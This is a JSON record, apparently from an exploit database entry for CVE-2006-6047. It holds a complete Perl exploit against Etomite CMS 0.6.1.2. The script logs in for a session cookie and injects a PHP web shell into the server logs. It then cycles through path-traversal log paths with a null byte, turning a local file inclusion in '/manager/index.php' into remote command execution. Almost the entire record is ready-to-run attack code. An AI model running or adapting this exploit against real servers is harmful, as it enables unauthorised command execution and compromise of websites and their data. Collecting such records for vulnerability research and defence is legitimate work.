{
  "id": "2790",
  "title": "Etomite CMS 0.6.1.2 - &#039;/manager/index.php&#039; Local File Inclusion",
  "cve": "CVE-2006-6047",
  "vuln_type": "path_traversal",
  "code": "#!/usr/bin/perl -w\r\n#\r\n#   Etomite CMS Remote Command Execution\r\n# Version:  0.6.1.2\r\n#     Url:  http://www.etomite.org\r\n# Author :  Alfredo Pesoli 'revenge'\r\n# Description:\r\n#\r\n# Input passed to the 'f' parameter in \"/manager/index.php\" isn't properly verified before being used in an include function, this can be exploited to include local files on target host or execute command, we need admin credentials to exploit this vuln.\r\n#\r\n# http://www.0xcafebabe.it\r\n# <revenge@0xcafebabe.it>\r\n\r\nuse strict;\r\nuse IO::Socket;\r\n\r\nif ( @ARGV < 5 ) { &usage(); }\r\n\r\nmy $target   = $ARGV[0];\r\nmy $username = $ARGV[1];\r\nmy $password = $ARGV[2];\r\nmy $path     = $ARGV[3];\r\nmy $cmd\t     = \"\";\r\nmy $cookie   = \"\";\r\nmy $uagent   = \"Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Debian)\";\r\n\r\nfor ( my $i=4; $i<=$#ARGV; $i++ ) {\r\n    $cmd.= \"+\".$ARGV[$i];\r\n}\r\n\r\n$cookie = &authenticate();\r\n\r\n&inject_logfile();\r\n\r\n&sploit();\r\n\r\nsub authenticate() {\r\n    my $res;\r\n    my $tmp;\r\n\r\n    print \"\\n -= Getting auth cookie =-\\n\\n\";\r\n    my $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$target\", PeerPort=>\"80\") or die \"\\n Could not connect to host\\n\\n\";\r\n    my $req = \"rememberme=0&location=&username=\".$username.\"&password=\".$password.\"&thing=&submit=Login&licenseOK=on\";\r\n    print $sock \"POST \".$path.\"processors/login.processor.php HTTP/1.1\\r\\n\";\r\n    print $sock \"Host: \".$target.\"\\r\\n\";\r\n    print $sock \"User-Agent: \".$uagent.\"\\r\\n\";\r\n    print $sock \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n    print $sock \"Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n\";\r\n    print $sock \"Accept-Encoding: gzip,deflate\\r\\n\";\r\n    print $sock \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n\";\r\n    print $sock \"Connection: close\\r\\n\";\r\n    print $sock \"Referer: http://\".$target.$path.\"index.php\\r\\n\";\r\n    print $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n    print $sock \"Content-Length: \".length($req).\"\\r\\n\\r\\n\";\r\n    print $sock $req;\r\n\r\n    while ( $res = <$sock> ) {\r\n\t$tmp.= $res;\t\r\n    }\r\n    close($sock);\r\n\r\n    my @temp\t= split /Cookie:/,$tmp;\r\n    my @cookie\t= split /Expires/,$temp[1];\r\n\r\n    print \" [#] COOKIE: \".$cookie[0].\"\\n\";\r\n    return $cookie[0];\r\n}\r\n\r\nsub inject_logfile() {\r\n    print \" -= Injecting log files =- \\n\";\r\n    my $mal=\"<?php ob_clean();echo lizardking;passthru(\\$_GET[cmd]);echo lizardking;?>\";\r\n    my $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$target\", PeerPort=>\"80\") or die \"\\n Could not connect to host\\n\\n\";\r\n    print $sock \"GET \".$path.$mal.\" HTTP/1.1\\r\\n\";\r\n    print $sock \"User-Agent: \".$uagent.\"\\r\\n\";\r\n    print $sock \"Host: \".$target.\"\\r\\n\";\r\n    print $sock \"Connection: close\\r\\n\\r\\n\";\r\n}\r\n\r\nsub sploit() {\r\n    my $res;\r\n    my $tmp;\r\n    my $i;\r\n    \r\n    my @http_paths= (\r\n\t\"../apache/logs/error.log\",\r\n\t\"../apache/logs/access.log\",\r\n\t\"../../apache/logs/error.log\",\r\n\t\"../../apache/logs/access.log\",\r\n\t\"../../../apache/logs/error.log\",\r\n\t\"../../../apache/logs/access.log\",\r\n\t\"../../../../../../../etc/httpd/logs/acces_log\",\r\n\t\"../../../../../../../etc/httpd/logs/acces.log\",\r\n\t\"../../../../../../../etc/httpd/logs/error_log\",\r\n\t\"../../../../../../../etc/httpd/logs/error.log\",\r\n\t\"../../../../../../../var/www/logs/access_log\",\r\n\t\"../../../../../../../var/www/logs/access.log\",\r\n\t\"../../../../../../../usr/local/apache/logs/access_log\",\r\n\t\"../../../../../../../usr/local/apache/logs/access.log\",\r\n\t\"../../../../../../../var/log/apache/access_log\",\r\n\t\"../../../../../../../var/log/apache2/access_log\",\r\n\t\"../../../../../../../var/log/apache/access.log\",\r\n\t\"../../../../../../../var/log/apache2/access.log\",\r\n\t\"../../../../../../../var/log/access_log\",\r\n\t\"../../../../../../../var/log/access.log\",\r\n\t\"../../../../../../../var/www/logs/error_log\",\r\n\t\"../../../../../../../var/www/logs/error.log\",\r\n\t\"../../../../../../../usr/local/apache/logs/error_log\",\r\n\t\"../../../../../../../usr/local/apache/logs/error.log\",\r\n\t\"../../../../../../../var/log/apache/error_log\",\r\n\t\"../../../../../../../var/log/apache2/error_log\",\r\n\t\"../../../../../../../var/log/apache/error.log\",\r\n\t\"../../../../../../../var/log/apache2/error.log\",\r\n\t\"../../../../../../../var/log/error_log\",\r\n\t\"../../../../../../../var/log/error.log\"\r\n    );\r\n\r\n    for ( $i=0; $i<=$#http_paths; $i++ ) {\r\n\tmy $sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$target\", PeerPort=>\"80\") or die \"\\n Could not connect to host\\n\\n\";\r\n\tprint $sock \"GET \".$path.\"index.php?cmd=\".$cmd.\"&a=1&f=\".$http_paths[$i].\"%00 HTTP/1.1\\r\\n\";\r\n\tprint $sock \"Host: \".$target.\"\\r\\n\";\r\n\tprint $sock \"Cookie: \".$cookie.\"\\r\\n\";\r\n\tprint $sock \"Connection: close\\r\\n\\r\\n\";\r\n\t\r\n\twhile ( $res = <$sock> ) { $tmp.= $res; }\r\n\tclose($sock);\r\n\t\r\n\tmy @temp = split /lizardking/,$tmp,3;\r\n\t\r\n\tif ( $#temp > 1 ) {\r\n\t    print \"\\n -= Executing: \".$cmd.\" =-\\n\\n [#] Exploit succedeed\\n\\n\".$temp[1].\"\\n\";\r\n\t    exit();\r\n\t}\r\n    }\r\n    print \"Exploit failed\\n\\n\";\r\n}\r\n\r\nsub usage() {\r\n    print \"\\n Etomite CMS 0.6.1.2 Remote Command Execution\\n\";\r\n    print \" <revenge\\@0xcafebabe.it>\\n\";\r\n    print \" http://www.0xcafebabe.it\\n\\n\";\r\n    print \"Usage: $0 <target> <username> <password> <directory> <command>\\n\";\r\n    print \"Example: $0 127.0.0.1 admin ghghgh /etomite/manager/ ls -la /\\n\\n\";\r\n    exit();\r\n}\r\n\r\n# milw0rm.com [2006-11-16]",
  "url": "https://www.exploit-db.com/exploits/2790"
}